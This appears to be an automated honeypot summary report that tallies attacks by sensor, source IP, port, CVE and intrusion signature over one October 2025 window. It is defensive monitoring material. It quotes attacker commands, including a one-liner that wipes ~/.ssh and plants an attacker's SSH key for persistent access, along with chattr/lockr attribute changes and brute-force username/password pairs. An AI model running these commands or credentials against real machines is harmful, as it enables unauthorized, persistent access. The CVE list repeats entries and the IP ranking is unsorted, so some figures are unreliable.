# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T19:01:25Z
**Timeframe:** 2025-10-16T18:20:01Z to 2025-10-16T19:00:01Z
**Files Used:**
- agg_log_20251016T182001Z.json
- agg_log_20251016T184001Z.json
- agg_log_20251016T190001Z.json

## Executive Summary

This report summarizes a total of 13,878 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie and Honeytrap honeypots. The most targeted service was SIP (port 5060). Attackers were observed attempting to gain unauthorized access and execute commands to gather system information.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 4403
- Honeytrap: 3318
- Sentrypeer: 2592
- Suricata: 1655
- Ciscoasa: 1619
- Tanner: 119
- Dionaea: 43
- ConPot: 38
- H0neytr4p: 23
- Mailoney: 17
- Ipphoney: 15
- Honeyaml: 14
- Miniprint: 9
- Adbhoney: 7
- Redishoneypot: 6

### Top Attacking IPs
- 23.94.26.58: 851
- 172.86.95.115: 494
- 172.86.95.98: 474
- 185.243.5.158: 447
- 103.172.154.255: 309
- 51.15.120.194: 282
- 137.184.145.163: 246
- 185.194.204.246: 247
- 107.170.36.5: 252
- 217.154.201.75: 331
- 164.90.207.105: 331

### Top Targeted Ports/Protocols
- 5060: 2592
- 22: 544
- TCP/5900: 288
- 5903: 228
- 8333: 155
- 80: 122
- 5901: 115

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500

### Commands Attempted by Attackers
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- Enter new UNIX password:

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Reserved Internal IP Traffic

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- root/Qaz123qaz
- default/default2020
- root/3245gs5662d34
- supervisor/supervisor2023
- kyt/123
- root/!!1qa2ws1QA2WS!!
- root/ABcd@1234
- root/Zc123456
- ubnt/ubnt2020

### Files Uploaded/Downloaded
- nse.html

### HTTP User-Agents
- No user agents recorded.

### SSH Clients
- No SSH clients recorded.

### SSH Servers
- No SSH servers recorded.

### Top Attacker AS Organizations
- No AS organizations recorded.

## Key Observations and Anomalies

- A significant number of attacks focused on reconnaissance, gathering information about the system's CPU and memory.
- Several attackers attempted to install a persistent SSH key for later access. The key is associated with the username "mdrfckr".
- The command `cd /data/local/tmp; su 0 mkdir .wellover222...` suggests an attempt to download and execute a malicious payload named `boatnet`.
- A small number of attacks targeted specific CVEs, including older vulnerabilities from 2002.
- The majority of traffic is automated scanning and brute-force attacks.
